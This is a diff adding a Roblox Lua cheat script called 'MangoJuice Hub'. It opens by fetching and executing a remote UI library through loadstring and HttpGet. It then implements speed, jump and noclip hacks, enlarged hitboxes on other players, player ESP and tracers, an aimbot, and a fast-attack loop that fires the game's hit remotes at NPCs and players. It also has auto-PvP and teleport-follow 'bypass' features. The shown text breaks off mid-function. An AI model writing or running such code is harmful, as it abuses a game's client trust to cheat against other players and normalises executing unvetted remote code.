@@ -1,0 +1,3726 @@
+repeat wait() until game:IsLoaded()
+
+local WindUI = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
+))()
+
+_G.Load = false
+local FirstSea = false
+local SecondSea = false
+local ThirdSea = false
+local Dungeons = false
+local LoadDone = false
+local Notify = WindUI.Notify
+local LoadNotify
+local SeaTP
+local SeaTP2
+
+local function gradient(text, startColor, endColor)
+    local result = ""
+    local length = #text
+
+    for i = 1, length do
+        local t = (i - 1) / math.max(length - 1, 1)
+        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
+        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
+        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)
+
+        local char = text:sub(i, i)
+        result = result ..
+            "<font color=\"rgb(" .. r .. "," .. g .. "," .. b .. ")\">" ..
+            char ..
+            "</font>"
+    end
+
+    return result
+end
+
+local function CheckLoad()
+    if LoadDone then
+        LoadNotify = Notify
+    else
+        LoadNotify = function() end
+    end
+    WindUI.Notify = LoadNotify 
+end
+
+if game.PlaceId == 4442272183 or game.PlaceId == 79091703265657 then
+       SecondSea = true
+   elseif game.PlaceId == 7449423635 or game.PlaceId == 100117331123089 then
+       ThirdSea = true
+   elseif game.PlaceId == 73902483975735 then
+        Dungeons = true
+   elseif game.PlaceId == 85211729168715 or game.PlaceId == 2753915549  then
+        FirstSea = true
+   else
+   WindUI:Notify({
+        Title = "MangoJuice Hub Notify",
+        Content = "This Is Not Support Game",
+        Icon = "solar:bell-bold",
+        Duration = 30,
+        CanClose = true,
+    })
+    task.wait(10)
+    game:GetService("Players").LocalPlayer:Kick("This Is Not Support Game")
+    return
+end
+
+if SecondSea then
+    SeaTP = 50
+    SeaTP2 = 100
+ elseif ThirdSea then
+    SeaTP = 100
+    SeaTP2 = 150
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local Workspace = game:GetService("Workspace")
+local Camera = Workspace.CurrentCamera
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Player = LocalPlayer
+local PlayerName = LocalPlayer.Name
+local PlayerId = LocalPlayer.UserId
+local PlayerDisplayName = LocalPlayer.DisplayName
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local CommF = Remotes:WaitForChild("CommF_")
+local CommE = Remotes:WaitForChild("CommE")
+local _Character = LocalPlayer.Character
+local RootPart = _Character and _Character:FindFirstChild("HumanoidRootPart")
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    _Character = char
+    RootPart = char:WaitForChild("HumanoidRootPart", 10)
+end)
+
+if not _Character then
+    WindUI:Notify({
+        Title = "MangoJuice Hub Notify",
+        Content = "Please Select Team",
+        Icon = "solar:bell-bold",
+        Duration = 5,
+        CanClose = false,
+    })
+end
+
+repeat 
+    task.wait()
+    _Character = game.Players.LocalPlayer.Character
+ until _Character
+ local _Tool = game.Players.LocalPlayer.Character
+ local VirtualInputManager = game:GetService("VirtualInputManager")
+
+
+ WindUI:Notify({
+    Title = "MangoJuice Hub Notify",
+    Content = "Loading.....",
+    Icon = "solar:bell-bold",
+    Duration = 10,
+    CanClose = false,
+})
+
+if _G.Load == true then
+    return
+end
+
+CheckLoad()
+
+wait(1.5)
+
+_G.Config = {
+    UI = {
+        Theme = "Midnight", --Midnight
+        Keybind = Enum.KeyCode.B,
+        AutoSave = false,
+        AutoLoad = false,
+    },
+
+    Camera = {
+        FOV = 60,
+        Zoom = 1000,
+    },
+
+    WalkSpeed = {
+        Enabled = false,
+        Speed = 50,
+    },
+
+    Dash = {
+        Enabled = false,
+        DashDistance = 50,
+    },
+
+    JumpPower = {
+        Enabled = false,
+        Power = 50,
+    },
+
+    Hitbox = {
+        Enabled = false,
+        Size = 10,
+    },
+
+    Race = {
+        AutoPvP = false,
+        AutoBuso = false,
+        AutoV3 = false,
+        AutoV4 = false,
+    },
+
+    Other = {
+        NoClip = false,
+        NoSoru = false,
+        WalkOnWater = false,
+        SafeMode = false,
+        SafeHealth = 90,
+    },
+
+    ESP = {
+        Enabled = false,
+        NameDistance = false,
+        Health = false,
+        Tracer = false,
+        NameSize = 100,
+        HealthSize = 100,
+    },
+
+    FastAttack = {
+        Enabled = false,
+        AttackNPC = false,
+        AttackPlayers = false,
+        Range = 100,
+        Delay = 0.3,
+        KitsuneAttack = false,
+        DragonAttack = false,
+        GasAttack = false,
+        InstaKill = false,
+        Saishi = false,
+        Spikey = false,
+    },
+
+    Aimbot = {
+        SelectPlayer = "",
+        AimlockSelect = false,
+        AimlockNearest = false,
+        AimbotSelect = false,
+        AimbotNearest = false,
+        Distance = 500,
+    },
+
+    Teleport = {
+        Enabled = {
+            Spectate = false,
+            ToPlayer = false,
+            Bypass = false,
+            BypassV2 = false,
+            Island = false,
+        },
+
+        Settings = {
+            SelectPlayer = "",
+            SelectIsland = "",
+            OffsetX = 0,
+            OffsetY = 0,
+            OffsetZ = 0,
+        },
+    }
+}
+
+local function SetZoom()
+    game.Players.LocalPlayer.CameraMaxZoomDistance = _G.Config.Camera.Zoom
+end
+
+local function SetFOV()
+    if _G.Config.Camera.FOV == 60 then return end
+        if workspace.CurrentCamera.FieldOfView ~= _G.Config.Camera.FOV then
+              workspace.CurrentCamera.FieldOfView = _G.Config.Camera.FOV
+        end
+end
+
+local FOVConnection
+if FOVConnection then FOVConnection:Disconnect() end
+FOVConnection = RunService.Heartbeat:Connect(SetFOV)
+
+local WalkSpeedENV = {}
+
+local function WalkSpeedStop()
+    if WalkSpeedENV.TranslateConnection then
+        WalkSpeedENV.TranslateConnection:Disconnect()
+        WalkSpeedENV.TranslateConnection = nil
+    end
+end
+
+local function WalkSpeedStart()
+    WalkSpeedStop()
+
+    WalkSpeedENV.TranslateConnection = RunService.Heartbeat:Connect(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+
+        local humanoid = char:FindFirstChild("Humanoid")
+        if not humanoid then return end
+
+        if humanoid.MoveDirection.Magnitude > 0 then
+            local moveDir = humanoid.MoveDirection
+            local speed = tonumber(_G.Config.WalkSpeed.Speed) or 50
+            local acceleration = moveDir * speed / 30
+            char:TranslateBy(acceleration)
+        end
+    end)
+end
+
+local function SetSpeed(value)
+    _G.Config.WalkSpeed.Speed = tonumber(value) or 50
+end
+
+local function EnbledWalkSpeed(enabled)
+    _G.Config.WalkSpeed.Enabled = enabled
+
+    if enabled then
+        WalkSpeedStart()
+    else
+        WalkSpeedStop()
+    end
+end
+
+WalkSpeedStop()
+
+local function Dash()
+    local character = Player.Character
+    if not character then return end
+
+    if _G.Config 
+        and _G.Config.Dash 
+        and _G.Config.Dash.Enabled then
+        
+        character:SetAttribute("DashLength", _G.Config.Dash.DashDistance)
+        character:SetAttribute("DashLengthAir", _G.Config.Dash.DashDistance)
+        LocalPlayer.CharacterAdded:Connect(function()
+            task.wait(0.1)
+            Dash()
+        end)
+    else
+        character:SetAttribute("DashLength", 1)
+        character:SetAttribute("DashLengthAir", 1)
+    end
+end
+
+local function JumpEnbled()
+    local char = Players.LocalPlayer.Character
+    if char and char:FindFirstChildOfClass("Humanoid") then
+        local HID = char:FindFirstChildOfClass("Humanoid")
+        HID.UseJumpPower = true
+        HID.JumpPower = _G.Config.JumpPower.Enabled and _G.Config.JumpPower.Power or 50
+    end
+end
+
+local function SetPower(value)
+    _G.Config.JumpPower.Power = tonumber(value) or 50
+    JumpEnbled()
+end
+
+local function EnbledJumpPower()
+    JumpEnbled()
+end
+
+task.spawn(function()
+    while true do
+        task.wait(1.5)
+        if Players.LocalPlayer.Character.Humanoid.JumpPower ~= _G.Config.JumpPower.Power then
+        JumpEnbled()
+        end
+    end
+end)
+
+Players.LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(0.2)
+    JumpEnbled()
+end)
+
+local HITBOX_VALUE = _G.HitboxSize or 50
+local HITBOX_COLOR = Color3.fromRGB(0,0,255) --Color3.fromRGB(0, 0, 255)
+local HITBOX_ALPHA = 0.8
+
+local Connections = {}
+local CharAddedConnections = {}
+local Originals = {}
+
+local function SetHitbox(player)
+    if player == LocalPlayer or Connections[player] then
+        return
+    end
+
+    Connections[player] = RunService.RenderStepped:Connect(function()
+        if not _G.Config.Hitbox.Enabled then return end
+
+        local char = player.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        if not Originals[player] then
+            Originals[player] = {
+                Size = hrp.Size,
+                Color = hrp.Color,
+                Transparency = hrp.Transparency,
+                CanCollide = hrp.CanCollide
+            }
+        end
+
+        local size = _G.Config.Hitbox.Size or 50
+
+        hrp.Size = Vector3.new(size, size, size)
+        hrp.Color = HITBOX_COLOR
+        hrp.Transparency = HITBOX_ALPHA
+        hrp.CanCollide = false
+    end)
+end
+
+local function WatchCharacter(player)
+    if CharAddedConnections[player] then return end
+
+    CharAddedConnections[player] = player.CharacterAdded:Connect(function()
+        task.wait(0.2)
+        Originals[player] = nil
+        if _G.Config.Hitbox.Enabled then
+            SetHitbox(player)
+        end
+    end)
+end
+
+local function EnableHitbox()
+    _G.Config.Hitbox.Enabled = true
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            SetHitbox(player)
+            WatchCharacter(player)
+        end
+    end
+end
+
+local function DisableHitbox()
+    _G.Config.Hitbox.Enabled = false
+
+    for _, conn in pairs(Connections) do
+        if conn then conn:Disconnect() end
+    end
+
+    for player, data in pairs(Originals) do
+        local char = player.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp and data then
+            hrp.Size = data.Size
+            hrp.Color = data.Color
+            hrp.Transparency = data.Transparency
+            hrp.CanCollide = data.CanCollide
+        end
+    end
+
+    for _, conn in pairs(CharAddedConnections) do
+        if conn then conn:Disconnect() end
+    end
+
+    table.clear(Connections)
+    table.clear(Originals)
+    table.clear(CharAddedConnections)
+end
+
+local autoV3Conn
+local V3Cooldown = 0.4
+local lastV3 = 0
+
+local function StartAutoV3()
+    if autoV3Conn then return end
+
+    autoV3Conn = RunService.Heartbeat:Connect(function()
+        if not _G.Config.Race.AutoV3 then
+            autoV3Conn:Disconnect()
+            autoV3Conn = nil
+            return
+        end
+
+        if os.clock() - lastV3 < V3Cooldown then return end
+        lastV3 = os.clock()
+
+        pcall(function()
+            CommE:FireServer("ActivateAbility")
+        end)
+    end)
+end
+
+Players.LocalPlayer.CharacterAdded:Connect(function()
+    if _G.Config.Race.AutoV3 then
+        StartAutoV3()
+    end
+end)
+
+local autoV4Conn
+local V4Cooldown = 0.4
+local lastV4 = 0
+
+local function findAwakeningTool()
+    local char = Player.Character
+    if not char then return end
+
+    return char:FindFirstChild("Awakening")
+        or Player.Backpack:FindFirstChild("Awakening")
+end
+
+local function StartAutoV4()
+    if autoV4Conn then return end
+
+    autoV4Conn = RunService.Heartbeat:Connect(function()
+        if not _G.Config.Race.AutoV4 then
+            autoV4Conn:Disconnect()
+            autoV4Conn = nil
+            return
+        end
+
+        if os.clock() - lastV4 < V4Cooldown then return end
+        lastV4 = os.clock()
+
+        local tool = findAwakeningTool()
+        if not tool then return end
+
+        local remote = tool:FindFirstChildWhichIsA("RemoteFunction")
+        if not remote then return end
+
+        pcall(function()
+            remote:InvokeServer(true)
+        end)
+    end)
+end
+
+local function AutoPvP()
+    while _G.Config.Race.AutoPvP do
+        game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('EnablePvp')
+        task.wait(1)
+    end
+end
+
+fm = fm or {}
+fm.ch = Players.LocalPlayer.Character
+local cg = game:GetService("PhysicsService")
+pcall(function() cg:RegisterCollisionGroup("NoCollision") end)
+
+Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    fm.ch = char
+    if _G.Config.Other.NoClip then
+        task.defer(function()
+            fm:EnableNoClip()
+        end)
+    end
+end)
+
+function fm:EnableNoClip()
+    if not self.ch then return end
+
+    if self._NoClipConnection then
+        self._NoClipConnection:Disconnect()
+    end
+
+    for _, x in ipairs(self.ch:GetDescendants()) do
+        if x:IsA("BasePart") then
+            x.CanCollide = false
+            pcall(function() x.CollisionGroup = "NoCollision" end)
+        end
+    end
+
+    self._NoClipConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        if not self.ch then return end
+        for _, x in ipairs(self.ch:GetDescendants()) do
+            if x:IsA("BasePart") then
+
+                if x.CanCollide then
+                    x.CanCollide = false
+                    pcall(function() x.CollisionGroup = "NoCollision" end)
+                end
+            end
+        end
+    end)
+end
+
+function fm:DisableNoClip()
+    if self._NoClipConnection then
+        self._NoClipConnection:Disconnect()
+        self._NoClipConnection = nil
+    end
+    if not self.ch then return end
+    for _, x in ipairs(self.ch:GetDescendants()) do
+        if x:IsA("BasePart") then
+            x.CanCollide = true
+            pcall(function() x.CollisionGroup = "Default" end)
+        end
+    end
+end
+
+local function NoClipSetting()
+    if _G.Config.Other.NoClip then
+        fm:EnableNoClip()
+    else
+        fm:DisableNoClip()
+    end
+end
+
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if _G.Config.Other.NoClip == true and fm.ch then
+            for _, x in ipairs(fm.ch:GetDescendants()) do
+                if x:IsA("BasePart") and x.CanCollide then
+                    fm:EnableNoClip()
+                    break
+                end
+            end
+        end
+    end
+end)
+
+local function RemoveFog()
+    local lighting = game:GetService("Lighting")
+            
+    if lighting:FindFirstChild("LightingLayers") then
+          lighting.LightingLayers:Destroy()
+    end
+
+    if lighting:FindFirstChild("Sky") then
+          lighting.Sky:Destroy()
+    end
+
+        lighting.FogEnd = 9000000000
+        lighting.FogStart = 0
+end
+
+local function RemoveLava()
+    for _, v in pairs(game.Workspace:GetDescendants()) do
+        if v.Name == "LavaParts" and v.Parent and v.Parent.Name == "CircleIsland" 
+            and v.Parent.Parent and v.Parent.Parent.Name == "Map" then
+            v:Destroy()
+        end
+    end
+
+    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+        if v.Name == "LavaParts" and v.Parent and v.Parent.Name == "CircleIsland" 
+            and v.Parent.Parent and v.Parent.Parent.Name == "Map" then
+            v:Destroy()
+        end
+    end
+
+    for _, v in pairs(game.Workspace:GetDescendants()) do
+        if v.Name == "Lava" and v.Parent and v.Parent.Name == "CircleIsland"
+        and v.Parent.Parent and v.Parent.Parent.Name == "Map" then
+        v:Destroy()
+        end
+    end
+
+    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+        if v.Name == "Lava" and v.Parent and v.Parent.Name == "CircleIsland"
+        and v.Parent.Parent and v.Parent.Parent.Name == "Map" then
+        v:Destroy()
+        end
+    end
+end
+
+local SafeToggle
+local SavePOS
+local SafeLoop
+
+local function GetHealth()
+    local Character = Player.Character
+    if not Character then return 100 end
+
+    local Humanoid = Character:FindFirstChild("Humanoid")
+    if not Humanoid then return 100 end
+
+    return (Humanoid.Health / Humanoid.MaxHealth) * 100
+end
+
+local function TPY()
+    local Character = Player.Character
+    local Root = Character:FindFirstChild("HumanoidRootPart")
+    local Health = GetHealth()
+    if Health < _G.Config.Other.SafeHealth then
+        if not SavePOS then
+            SavePOS = Root.CFrame
+            WindUI:Notify({
+                Title = "MangoJuice Hub Notify",
+                Content = "Safe Mode\nYou Health < ".._G.Config.Other.SafeHealth.." Teleported To Void",
+                Icon = "solar:bell-bold",
+                Duration = 3
+            })
+        end
+        if _G.Config.Teleport.Enabled.Bypass then
+            stopFollow()
+        end
+        Root.CFrame = SavePOS + Vector3.new(0,10000,0)
+    elseif SavePOS and Health > (_G.Config.Other.SafeHealth + 10) then
+        Root.CFrame = SavePOS
+        SavePOS = nil
+        if _G.Config.Teleport.Enabled.Bypass then
+            startFollow()
+        end
+    end
+end
+
+local ESPElements = {}
+
+local function CleanupPlayerESP(player)
+    local e = ESPElements[player.UserId]
+    if not e then return end
+
+    if e.NameHealthESP then e.NameHealthESP:Destroy() e.NameHealthESP = nil end
+    if e.NameHealthUpdateConn then e.NameHealthUpdateConn:Disconnect() e.NameHealthUpdateConn = nil end
+    if e.Tracer then e.Tracer:Remove() e.Tracer = nil end
+    if e.TracerConn then e.TracerConn:Disconnect() e.TracerConn = nil end
+
+    ESPElements[player.UserId] = nil
+end
+
+local function CreateNameDistanceESP(player)
+    if not player.Character or not player.Character:FindFirstChild("Head") then return end
+    local head = player.Character.Head
+    local e = ESPElements[player.UserId] or {}
+
+    if e.NameHealthESP then e.NameHealthESP:Destroy() end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "NameDistanceESP"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, _G.Config["ESP"]["NameSize"], 0, _G.Config["ESP"]["NameSize"]/4)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
+
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Parent = billboard
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.TextColor3 = Color3.new(1,1,1)
+    nameLabel.TextScaled = true
+    nameLabel.Font = Enum.Font.GothamSemibold
+    nameLabel.Size = UDim2.new(1,0,1,0)
+    nameLabel.Text = player.Name
+
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if not billboard.Parent or not LocalPlayer.Character or not player.Character then return end
+        local root = player.Character:FindFirstChild("HumanoidRootPart")
+        local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root and localRoot then
+            if _G.Config.ESP.Enabled and _G.Config.ESP.NameDistance then
+                nameLabel.Text = player.Name.." "..string.format("Distance:%.1f", (root.Position - localRoot.Position).Magnitude)
+                billboard.Enabled = true
+            else
+                billboard.Enabled = false
+            end
+        end
+    end)
+
+    e.NameHealthESP = billboard
+    e.NameHealthUpdateConn = conn
+    ESPElements[player.UserId] = e
+end
+
+local function CreateHealthESP(player)
+    if not player.Character or not player.Character:FindFirstChild("Humanoid") or not player.Character:FindFirstChild("Head") then return end
+    local head = player.Character.Head
+    local humanoid = player.Character.Humanoid
+    local e = ESPElements[player.UserId] or {}
+
+    if e.HealthESP then e.HealthESP:Destroy() end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "HealthESP"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, _G.Config["ESP"]["HealthSize"], 0, _G.Config["ESP"]["HealthSize"]/2)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
+
+    local healthLabel = Instance.new("TextLabel")
+    healthLabel.Parent = billboard
+    healthLabel.BackgroundTransparency = 1
+    healthLabel.TextScaled = true
+    healthLabel.Font = Enum.Font.Gotham
+    healthLabel.Size = UDim2.new(1,0,1,0)
+
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if not billboard.Parent or not humanoid then return end
+        if _G.Config.ESP.Enabled and _G.Config.ESP.Health then
+            local hp = math.floor(humanoid.Health)
+            local maxHp = math.floor(humanoid.MaxHealth)
+            healthLabel.Text = string.format("Health:%d/%d", hp, maxHp)
+            local p = hp/maxHp
+            healthLabel.TextColor3 = p>0.7 and Color3.new(0,1,0) or p>0.3 and Color3.new(1,1,0) or Color3.new(1,0,0)
+            billboard.Enabled = true
+        else
+            billboard.Enabled = false
+        end
+    end)
+
+    e.HealthESP = billboard
+    e.HealthUpdateConn = conn
+    ESPElements[player.UserId] = e
+end
+
+local function CreateTracerESP(player)
+    local e = ESPElements[player.UserId] or {}
+    if e.Tracer then e.Tracer:Remove() end
+
+    local tracer = Drawing.new("Line")
+    tracer.Color = Color3.new(0,0,1)
+    tracer.Thickness = 2
+    tracer.Transparency = 0.8
+    tracer.Visible = false
+
+    local conn = RunService.RenderStepped:Connect(function()
+        if not _G.Config.ESP.Enabled or not _G.Config.ESP.Tracer then
+            tracer.Visible = false
+            return
+        end
+        local char = player.Character
+        local localChar = LocalPlayer.Character
+        if char and localChar then
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                local screenPos, onScreen = Camera:WorldToViewportPoint(root.Position)
+                if onScreen then
+                    tracer.Visible = true
+                    tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+                    tracer.To = Vector2.new(screenPos.X, screenPos.Y)
+                else
+                    tracer.Visible = false
+                end
+            else
+                tracer.Visible = false
+            end
+        else
+            tracer.Visible = false
+        end
+    end)
+
+    e.Tracer = tracer
+    e.TracerConn = conn
+    ESPElements[player.UserId] = e
+end
+
+local function UpdatePlayerESP(player)
+    if player == LocalPlayer then return end
+    if not player.Character then CleanupPlayerESP(player) return end
+    if _G.Config.ESP.Enabled == true then
+        if _G.Config.ESP.NameDistance then CreateNameDistanceESP(player) end
+        if _G.Config.ESP.Health then CreateHealthESP(player) end
+        if _G.Config.ESP.Tracer then CreateTracerESP(player) end
+    else
+        CleanupPlayerESP(player)
+    end
+end
+
+function UpdateAllESP()
+    for _, p in pairs(Players:GetPlayers()) do
+        UpdatePlayerESP(p)
+    end
+end
+
+local function BindPlayerESP(PlayerObj)
+    if PlayerObj == LocalPlayer then
+        return
+    end
+
+    PlayerObj.CharacterAdded:Connect(function()
+        task.wait(1)
+        UpdatePlayerESP(PlayerObj)
+    end)
+
+    PlayerObj.CharacterRemoving:Connect(function()
+        CleanupPlayerESP(PlayerObj)
+    end)
+end
+
+local function StartESPWatchers()
+    for _, PlayerObj in ipairs(Players:GetPlayers()) do
+        BindPlayerESP(PlayerObj)
+    end
+
+    Players.PlayerAdded:Connect(BindPlayerESP)
+
+    LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(1)
+        UpdateAllESP()
+    end)
+
+    task.spawn(function()
+        while task.wait(3) do
+            if _G.Config.ESP.Enabled then
+                UpdateAllESP()
+            end
+        end
+    end)
+end
+
+StartESPWatchers()
+
+local ENV = (getgenv or getrenv or getfenv)()
+
+local Settings = {
+    AutoClick = _G.Config.FastAttack.Enabled,
+    ClickDelay = _G.Config.FastAttack.Delay,
+    Distance = _G.Config.FastAttack.Range,
+}
+
+local function SafeWaitForChild(parent, childName)
+	local success, result = pcall(function()
+		return parent:WaitForChild(childName, 10)
+	end)
+	return result
+end
+
+local function CheckAndGetCoreComponents()
+	while true do
+		local Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
+		local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
+		local Net = Modules and SafeWaitForChild(Modules, "Net")
+		local RegisterAttack = Net and SafeWaitForChild(Net, "RE/RegisterAttack")
+		local RegisterHit = Net and SafeWaitForChild(Net, "RE/RegisterHit")
+		local Enemies = SafeWaitForChild(workspace, "Enemies")
+		if Remotes and Modules and Net and RegisterAttack and RegisterHit and Enemies then
+			return Remotes, Net, RegisterAttack, RegisterHit, Enemies
+		end
+		task.wait(1)
+	end
+end
+
+local function IsAlive(character)
+	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	return humanoid and humanoid.Health > 0
+end
+
+local function GetRandomValidPart(target)
+	for _, v in ipairs(target:GetDescendants()) do
+		if v:IsA("BasePart") then
+			return v
+		end
+	end
+	return target:FindFirstChild("HumanoidRootPart")
+end
+
+local function BuildFastAttack()
+    local FastAttack = {}
+
+    local function CollectEnemies(list, folder)
+        if not folder then return end
+
+        for _, enemy in ipairs(folder:GetChildren()) do
+            if enemy ~= Player.Character and IsAlive(enemy) then
+                local part = GetRandomValidPart(enemy)
+                if part and Player:DistanceFromCharacter(part.Position) <= _G.Config.FastAttack.Range then
+                    table.insert(list, { enemy, part })
+                end
+            end
+        end
+    end
+
+    function FastAttack:Attack()
+        local _, _, RegisterAttack, RegisterHit, Enemies = CheckAndGetCoreComponents()
+        local targets = {}
+
+        if _G.Config.FastAttack.AttackNPC then
+            CollectEnemies(targets, Enemies)
+        end
+
+        if _G.Config.FastAttack.AttackPlayers then
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr ~= Player and IsAlive(plr.Character) then
+                    local part = GetRandomValidPart(plr.Character)
+                    if part and Player:DistanceFromCharacter(part.Position) <= _G.Config.FastAttack.Range then
+                        table.insert(targets, { plr.Character, part })
+                    end
+                end
+            end
+        end
+
+        if #targets > 0 then
+            RegisterAttack:FireServer(_G.Config.FastAttack.Delay)
+            RegisterHit:FireServer(targets[1][2], targets)
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            task.wait(_G.Config.FastAttack.Delay)
+
+            if _G.Config.FastAttack.Enabled then
+                FastAttack:Attack()
+            end
+        end
+    end)
+
+    return FastAttack
+end
+
+local function InitFastAttack()
+    if ENV.rz_FastAttack then
+        return ENV.rz_FastAttack
+    end
+    ENV.rz_FastAttack = BuildFastAttack()
+    return ENV.rz_FastAttack
+end
+
+local FastAttack = InitFastAttack()
+
+local Aimbot_NearestAimConnection = nil
+local Aimbot_SelectedAimConnection = nil
+
+local function Aimbot_GetDistanceSquared(pos1, pos2)
+    return (pos1 - pos2).Magnitude^2
+end
+
+local function Aimbot_GetNearestPlayer()
+    local closestPlayer = nil
+    local maxDistanceSq = _G.Config.Aimbot.Distance * _G.Config.Aimbot.Distance
+    local shortestDistance = maxDistanceSq
+
+    local myCharacter = LocalPlayer.Character
+    if not myCharacter or not myCharacter:FindFirstChild("HumanoidRootPart") then
+        return nil
+    end
+
+    local root = myCharacter.HumanoidRootPart
+    local myPosition = root.Position
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer
+        and player.Character
+        and player.Character:FindFirstChild("HumanoidRootPart") then
+
+            local targetPos = player.Character.HumanoidRootPart.Position
+            local distance = Aimbot_GetDistanceSquared(myPosition, targetPos)
+
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestPlayer = player
+            end
+        end
+    end
+
+    if closestPlayer then
+        local targetPos = closestPlayer.Character.HumanoidRootPart.Position
+
+        -- ⭐ 直接在這裡讓角色朝向目標
+        local lookAtPosition = Vector3.new(
+            targetPos.X,
+            myPosition.Y, -- 保持水平
+            targetPos.Z
+        )
+
+        root.CFrame = CFrame.new(myPosition, lookAtPosition)
+
+        return targetPos
+    end
+
+    return nil
+end
+
+local function Aimbot_GetSelectedPlayerPosition()
+    local name = _G.Config.Aimbot.SelectPlayer
+    if not name or name == "" then return nil end
+
+    local myCharacter = LocalPlayer.Character
+    if not myCharacter or not myCharacter:FindFirstChild("HumanoidRootPart") then
+        return nil
+    end
+
+    local root = myCharacter.HumanoidRootPart
+    local myPosition = root.Position
+
+    local plr = Players:FindFirstChild(name)
+    if plr
+    and plr.Character
+    and plr.Character:FindFirstChild("HumanoidRootPart") then
+
+        local targetPos = plr.Character.HumanoidRootPart.Position
+
+        -- ⭐ 直接轉向
+        local lookAtPosition = Vector3.new(
+            targetPos.X,
+            myPosition.Y,
+            targetPos.Z
+        )
+
+        root.CFrame = CFrame.new(myPosition, lookAtPosition)
+
+        return targetPos
+    end
+
+    return nil
+end
+
+local function Aimbot_GetPlayerList()
+    local list = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            table.insert(list, plr.Name)
+        end
+    end
+    return list
+end
+
+local function Aimbot_StopAll()
+    if Aimbot_SelectedAimConnection then
+        Aimbot_SelectedAimConnection:Disconnect()
+        Aimbot_SelectedAimConnection = nil
+    end
+
+    if Aimbot_NearestAimConnection then
+        Aimbot_NearestAimConnection:Disconnect()
+        Aimbot_NearestAimConnection = nil
+    end
+end
+
+local function Teleport_GetPlayerList()
+    local list = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            table.insert(list, plr.Name)
+        end
+    end
+    return list
+end
+
+local function SpectatToSelectedPlayer()
+    if not _G.Config.Teleport.Enabled.Spectate then return end
+    if not _G.Config.Teleport.Settings.SelectPlayer then return end
+    local targetPlayer = Players:FindFirstChild(_G.Config.Teleport.Settings.SelectPlayer)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+        Camera.CameraType = Enum.CameraType.Custom
+        Camera.CameraSubject = targetPlayer.Character.Humanoid
+    end
+end
+
+local toggleThread
+local toggleState = false
+local toggleRunning = false
+local followConnection = nil
+local SlowFollowSpeed = 300
+local bypass = false
+local BypassY
+local FPSCon
+
+local function stopFollow()
+    toggleRunning = false
+    toggleState = false
+
+    if followConnection then
+        followConnection:Disconnect()
+        followConnection = nil
+
+        if FPSCon then
+            FPSCon:Disconnect()
+            FPSCon = nil
+        end
+
+        fm:DisableNoClip()
+
+        if _G.Config.WalkSpeed.Enabled then
+            WalkSpeedStart()
+        end
+    end
+end
+
+local function startFollow()
+    if FPSCon then
+        FPSCon:Disconnect()
+        FPSCon = nil
+    end
+    
+    FPSCon = RunService.RenderStepped:Connect(function(dt)
+        local FPS = 1/dt
+    
+        if FPS > 120 then
+            SlowFollowSpeed = 300
+        elseif FPS < 120 then
+            SlowFollowSpeed = 350
+        end
+    end)
+
+    local CloseRangeSuperSpeed = 300000000000000000000000000000000000000000E99
+
+    if followConnection then 
+        followConnection:Disconnect() 
+    end
+
+    followConnection = RunService.Heartbeat:Connect(function(dt)
+        if not (_G.Config.Teleport.Enabled.ToPlayer or _G.Config.Teleport.Enabled.Bypass) then 
+            return 
+        end
+        if not _G.Config.Teleport.Settings.SelectPlayer then 
+            return 
+        end
+
+        local target = Players:FindFirstChild(_G.Config.Teleport.Settings.SelectPlayer)
+        if not target or not target.Character then 
+            return 
+        end
+
+        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
+        if not targetHRP then 
+            return 
+        end
+
+        local char = LocalPlayer.Character
+        if not char then 
+            return 
+        end
+
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then 
+            return 
+        end
+
+        if _G.Config.WalkSpeed.Enabled then
+            WalkSpeedStop()
+        end
+
